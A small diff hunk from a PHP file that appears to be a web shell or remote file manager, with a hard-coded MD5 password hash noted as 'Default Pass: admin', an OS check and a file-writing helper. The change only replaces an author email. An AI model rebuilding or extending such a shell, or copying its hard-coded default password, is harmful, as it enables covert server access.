@@ -42,7 +42,7 @@ if (function_exists('pg_close')) {
 }
 $password = '8ef6fe78158373e4ccd674877f11952c'; //Default Pass: admin
 $win = substr(PHP_OS, 0, 3) == 'WIN' ? true : false;
-$msg = '(kiwwkw@gmail.com)'; //Copyright Do not Remove
+$msg = '(admin@gmail.com)'; //Copyright Do not Remove
 function filew($filename, $filedata, $filemode)
 {
     if (!is_writable($filename) && file_exists($filename)) {
